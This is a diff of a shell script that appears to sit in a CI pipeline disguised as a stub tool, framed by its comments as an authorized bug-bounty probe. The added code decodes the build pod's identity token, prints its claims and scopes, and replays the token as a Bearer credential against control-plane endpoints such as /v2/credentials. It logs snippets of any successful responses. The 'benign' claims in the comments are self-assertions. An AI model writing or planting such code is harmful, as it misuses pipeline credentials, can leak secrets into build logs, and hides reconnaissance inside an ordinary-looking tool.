@@ -1,41 +1,52 @@
 #!/bin/sh
-# Benign, bounded reachability probe for an authorized bug-bounty test (Bugcrowd sap-og24).
-# Prints ENVIRONMENT VARIABLE NAMES ONLY (never a value), and HTTP STATUS CODES ONLY for a
-# handful of paths on the one internal host this job's own pipeline already contacts.
-# It clones nothing, reads no secret, writes nothing outside the workspace, and includes
-# negative controls so a "reachable" result cannot be a false positive.
-N=KP-MIRROR-7788
-H=http://git-mirror.pipeline-services.svc.cluster.local
+# Benign, bounded authority probe for an authorized bug-bounty test (Bugcrowd sap-og24).
+# The build-pod identity token NEVER leaves the pod and is NEVER printed: only its claim NAMES
+# and iss/aud/scope are echoed. Every request is a read-only GET against the CI/CD service's own
+# control plane, each paired with a no-token negative control and a nonexistent-path control.
+N=KP-AUTH-7788
 p() { echo "$N $*" 1>&2; }
 
-p "ctx whoami=$(id -un) host=$(hostname) pwd=$(pwd) argv=[$*]"
+p "ctx host=$(hostname) job=$JOB_NAME build=$BUILD_NUMBER pipeline=$PIPELINE ver=$PIPELINE_VERSION"
+p "API_SELF_LINK=$API_SELF_LINK"
+p "BACK_CHANNEL_URL=$BACK_CHANNEL_URL"
+p "UI_SELF_LINK=$UI_SELF_LINK"
+p "PIPER_DISABLE_EXTENSIONS=$PIPER_DISABLE_EXTENSIONS PP_CONFIGURATION_SOURCE=$PP_CONFIGURATION_SOURCE"
 
-p "--- environment variable NAMES only (no values) ---"
-env | cut -d= -f1 | sort | tr '\n' ' ' | sed "s|^|$N envnames: |" 1>&2
-echo "" 1>&2
+# ---- token shape only: claim NAMES + iss/aud/scope. Never the token, never the signature. ----
+T="$BUILD_IDENTITY_JWT"
+if [ -n "$T" ]; then
+  p "token: present len=$(printf %s "$T" | wc -c) dots=$(printf %s "$T" | tr -cd . | wc -c)"
+  d() { s=$1; case $((${#s} % 4)) in 2) s="$s==";; 3) s="$s=";; esac
+        printf %s "$s" | tr '_-' '/+' | base64 -d 2>/dev/null; }
+  HDR=$(d "$(printf %s "$T" | cut -d. -f1)")
+  PL=$(d  "$(printf %s "$T" | cut -d. -f2)")
+  p "hdr: $(printf %s "$HDR" | head -c 200)"
+  p "payload claim NAMES: $(printf %s "$PL" | tr ',' '\n' | sed -n 's/.*"\([A-Za-z0-9_]*\)"[[:space:]]*:.*/\1/p' | sort -u | tr '\n' ' ')"
+  for k in iss aud scope authorities grant_type client_id azp typ; do
+    v=$(printf %s "$PL" | sed -n "s/.*\"$k\"[[:space:]]*:[[:space:]]*\(\"[^\"]*\"\|\[[^]]*\]\).*/\1/p" | head -c 200)
+    [ -n "$v" ] && p "claim $k = $v"
+  done
+else
+  p "token: ABSENT"
+fi
 
-if command -v curl >/dev/null 2>&1; then CL=curl; elif command -v wget >/dev/null 2>&1; then CL=wget; else CL=none; fi
-p "http-client=$CL"
+B="$BACK_CHANNEL_URL"
+[ -z "$B" ] && B="$(printf %s "$API_SELF_LINK" | sed -E 's#(https?://[^/]+).*#\1#')"
+p "base=$B"
 
-q() {
-  case "$CL" in
-    curl) c=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 "$H$1" 2>/dev/null) ;;
-    wget) c=$(wget -q -S -O /dev/null --timeout=8 "$H$1" 2>&1 | awk '/HTTP\//{print $2}' | tail -1) ;;
-    *)    c=no-client ;;
-  esac
-  p "GET $1 -> ${c:-ERR}"
+g() { # path label  -> status + byte length, with a NO-TOKEN control
+  a=$(curl -s -o /tmp/kpa -w '%{http_code}' --max-time 10 -H "Authorization: Bearer $T" -H 'Accept: application/json' "$B$1" 2>/dev/null)
+  b=$(curl -s -o /tmp/kpb -w '%{http_code}' --max-time 10 -H 'Accept: application/json' "$B$1" 2>/dev/null)
+  p "GET $1 -> with-token=${a:-ERR} bytes=$(wc -c < /tmp/kpa 2>/dev/null) | no-token=${b:-ERR}"
+  if [ "$a" = "200" ]; then p "   shape: $(head -c 180 /tmp/kpa | tr -d '\n')"; fi
 }
 
-p "--- status codes only ---"
-q "/"
-q "/git/"
-q "/git/cloudci/pipeline-lib.git/info/refs?service=git-upload-pack"
-q "/git/cloudci/kp-no-such-repo-7788.git/info/refs?service=git-upload-pack"
-q "/git/kp-no-such-org-7788/kp-no-such-repo-7788.git/info/refs?service=git-upload-pack"
+p "--- control plane, read-only ---"
+g "/v2/jobs"
+g "/v2/credentials"
+g "/v2/repositories"
+g "/v2/kp-no-such-endpoint-7788"
 p "--- done ---"
 
-case "$1" in
-  version) echo "$N stub" ;;
-  *)       echo '{}' ;;
-esac
+case "$1" in version) echo "$N stub" ;; *) echo '{}' ;; esac
 exit 0
